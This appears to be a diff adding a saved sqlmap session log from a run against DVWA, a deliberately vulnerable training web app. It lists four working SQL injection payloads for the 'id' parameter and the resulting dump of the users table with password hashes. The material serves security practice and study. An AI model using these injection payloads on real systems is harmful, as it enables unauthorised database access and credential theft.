@@ -1,0 +1,87 @@
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.10.6.152#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:54:48 /2026-06-23/
+
+[20:54:48] [INFO] testing connection to the target URL
+[20:54:48] [INFO] searching for forms
+[1/1] Form:
+GET http://dvwa/vulnerabilities/sqli/?id=&Submit=Submit
+Cookie: PHPSESSID=2ntikvb0v6292f6d44mp4ac6m0; security=low
+do you want to test this form? [Y/n/q] 
+> Y
+Edit GET data [default: id=&Submit=Submit]: id=&Submit=Submit
+do you want to fill blank fields with random values? [Y/n] Y
+[20:54:48] [INFO] using '/root/.local/share/sqlmap/output/results-06232026_0854pm.csv' as the CSV results file in multiple targets mode
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: id=5963' OR NOT 6521=6521-- qQgS&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=5963' AND EXTRACTVALUE(4504,CONCAT(0x5c,0x7171706b71,(SELECT (ELT(4504=4504,1))),0x7170716b71))-- HCdh&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=5963' AND (SELECT 8631 FROM (SELECT(SLEEP(5)))Ayee)-- ctqu&Submit=Submit
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=5963' UNION ALL SELECT CONCAT(0x7171706b71,0x4b4e784a6663787358765443715a53734371654f674243665050676c717265637a676e62774f4f52,0x7170716b71),NULL-- -&Submit=Submit
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[20:54:48] [INFO] testing MySQL
+[20:54:48] [INFO] confirming MySQL
+[20:54:48] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+[20:54:48] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[20:54:48] [INFO] fetching current database
+[20:54:48] [WARNING] reflective value(s) found and filtering out
+[20:54:48] [INFO] fetching tables for database: 'dvwa'
+[20:54:48] [INFO] fetching columns for table 'users' in database 'dvwa'
+[20:54:48] [INFO] fetching entries for table 'users' in database 'dvwa'
+[20:54:48] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [y/N/q] N
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 | admin     | admin      | 2026-06-23 20:18:38 | 0            |
+| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     | 2026-06-23 20:18:38 | 0            |
+| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       | 2026-06-23 20:18:38 | 0            |
+| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      | 2026-06-23 20:18:38 | 0            |
+| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        | 2026-06-23 20:18:38 | 0            |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+
+[20:54:48] [INFO] table 'dvwa.users' dumped to CSV file '/root/.local/share/sqlmap/output/dvwa/dump/dvwa/users.csv'
+[20:54:48] [INFO] fetching columns for table 'guestbook' in database 'dvwa'
+[20:54:48] [INFO] fetching entries for table 'guestbook' in database 'dvwa'
+Database: dvwa
+Table: guestbook
+[1 entry]
++------------+--------+-------------------------+
+| comment_id | name   | comment                 |
++------------+--------+-------------------------+
+| 1          | test   | This is a test comment. |
++------------+--------+-------------------------+
+
+[20:54:48] [INFO] table 'dvwa.guestbook' dumped to CSV file '/root/.local/share/sqlmap/output/dvwa/dump/dvwa/guestbook.csv'
+[20:54:48] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-06232026_0854pm.csv'
+
+[*] ending @ 20:54:48 /2026-06-23/
+
+
